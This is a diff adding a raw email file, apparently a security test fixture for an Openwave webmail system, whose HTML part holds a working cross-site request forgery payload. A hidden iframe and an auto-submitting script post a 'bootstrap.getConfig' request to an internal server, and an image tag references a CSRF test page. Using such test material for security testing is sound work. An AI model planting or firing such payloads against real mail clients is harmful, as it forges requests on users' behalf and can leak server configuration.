@@ -1,0 +1,50 @@
+Return-Path: <08035875455/TYPE=PLMN@openwave.com>
+Received: from fepmsshost ([172.20.0.78]) by fepmsshost.openwave.com
+          (InterMail vM.9.01.00.09 201-2473-137-104-109) with ESMTP
+          id <20150716055958.AAC3572.fepmsshost.openwave.com@fepmsshost>;
+          Thu, 16 Jul 2015 01:59:58 -0400
+Received: from [10.13.2.159]
+	by 172.20.0.78 with HTTP; Thu, 16 Jul 2015 01:59:58 -0400
+To: 44055 <08035444055@openwave.com>, 
+	=?UTF-8?B?5bed5re7IOWGhummmQ==?= <08035875455@openwave.com>
+Message-ID: <49cb4acf.d.14e9572af54.Webtop.78@>
+Subject: test img
+MIME-Version: 1.0
+Content-Type: multipart/alternative; 
+	boundary="----=_Part_26_439478919.1437026398028"
+User-Agent: OWM Mail 3
+X-SID: 78
+X-Originating-IP: [10.13.2.159]
+From: 08035875455/TYPE=PLMN
+Date: Thu, 16 Jul 2015 01:59:58 -0400 (EDT)
+
+------=_Part_26_439478919.1437026398028
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 7bit
+
+
+
+ccc
+
+------=_Part_26_439478919.1437026398028
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"> 
+<html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /> 
+
+</head> <body><img src="https://jira.owmessaging.com/secure/attachment/46526/CSRF_Fusion.html" title="testjs">
+
+<iframe style="width: 0px; height: 0px; visibility: hidden" name="hidden"></iframe>
+	<form name="csrf" action="http://172.20.1.123:8080/kiwi-octane/json" method="POST" target="hidden">
+		<input type="hidden" name="r" value="{'method': 'bootstrap.getConfig'}">
+		<!-- <input type="hidden" name="page" value="1">
+		<input type="hidden" name="start" value="0">
+		<input type="hidden" name="limit" value="25"> -->
+	<script>document.csrf.submit();</script>
+
+<br><br><div class="signature" id="6281107080494756262">23</div></body>
+
+
+</html>
+------=_Part_26_439478919.1437026398028--
